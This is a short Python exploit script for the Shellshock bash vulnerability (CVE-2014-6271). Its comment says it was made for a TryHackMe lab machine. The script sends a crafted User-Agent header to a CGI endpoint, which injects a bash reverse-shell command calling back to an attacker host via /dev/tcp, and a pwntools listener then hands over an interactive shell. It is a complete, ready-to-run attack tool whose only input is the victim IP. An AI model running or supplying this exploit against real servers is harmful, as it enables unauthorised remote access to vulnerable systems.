#!/usr/bin/python3

# CVE: CVE-2014-6271 - ShellShock                      
# Note: This is an exploit made for the 0day machine on TryHackMe.

from pwn import *
import argparse
import requests
import threading
import time
import sys
import signal


# ctrl+c 
def def_handler(sig, frame):
    print("\n\n[!] Exit...\n")    
    sys.exit(1)

signal.signal(signal.SIGINT, def_handler)


parser = argparse.ArgumentParser()
parser.add_argument('-v', '--ipvictim', help='IP victim')
parser.add_argument('-i', '--lhosts', help='Attacker host')
parser.add_argument('-p', '--lport', help='Attacker port')

# define url and attacker ip
args = parser.parse_args()
ipv = args.ipvictim
lport = args.lport
lhosts = args.lhosts    

# is sent in malicious User-Agent
def reverseShell():
    
    # wait 3 seconds to avoid port listening errors
    time.sleep(3)
    
    url = " http://{}/cgi-bin/test.cgi".format(ipv)
    payload = '() { :; }; /bin/bash -c sh -i >& /dev/tcp/%s/%s 0>&1' % (lhosts, lport)
    headers = {'User-Agent': payload}
    
    requests.get(url, headers=headers)


def listen2():
    
    shell = listen(lport, timeout=20).wait_for_connection()
    if shell.sock is None:
        log.failure("Could not establish connection")
        sys.exit(1)
    else:
        shell.interactive()
        
    
if __name__ == '__main__':
    
    
    threading.Thread(target=reverseShell, args=()).start()
    listen2()
